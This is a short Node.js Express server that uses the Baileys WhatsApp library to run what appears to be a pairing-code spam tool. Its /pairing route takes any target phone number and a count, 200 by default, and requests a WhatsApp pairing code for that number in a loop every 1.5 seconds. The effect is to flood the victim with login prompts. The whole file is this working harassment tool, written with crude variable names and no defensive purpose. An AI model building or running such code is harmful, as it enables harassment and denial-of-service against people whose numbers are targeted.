const express = require("express")
const path = require("path")
const cors = require("cors")
const pino = require("pino")
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')

const app = express()
const PORT = process.env.PORT || 3000

app.use(cors())
app.use(express.static(path.join(__dirname, "public")))

const sleep = (ms) => new Promise(res => setTimeout(res, ms))

app.get("/pairing/:number/:amount?", async (req, res) => {
  try {
    let text = `${req.params.number}|${req.params.amount || "200"}`
    if (!text) return res.json({ status: false, message: "Example: /pairing/628xxxxxx/150" })

    res.json({ status: true, message: "otw kink!!", number: req.params.number, amount: req.params.amount })

    let [peenis, pepekk = "200"] = text.split("|")
    let target = peenis.replace(/[^0-9]/g, '').trim()

    let { state } = await useMultiFileAuthState('pepek')
    let { version } = await fetchLatestBaileysVersion()
    let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

    for (let i = 0; i < pepekk; i++) {
      await sleep(1500)
      let prc = await sucked.requestPairingCode(target)
      console.log(`Succes Pairing Code - Number : ${target} - Code : ${prc}`)
    }
  } catch (err) {
    console.error(err)
    res.json({ status: false, error: err.message })
  }
})

// start 
app.listen(PORT, () => {
  console.log(`🚀 Server jalan di http://localhost:${PORT}`)
})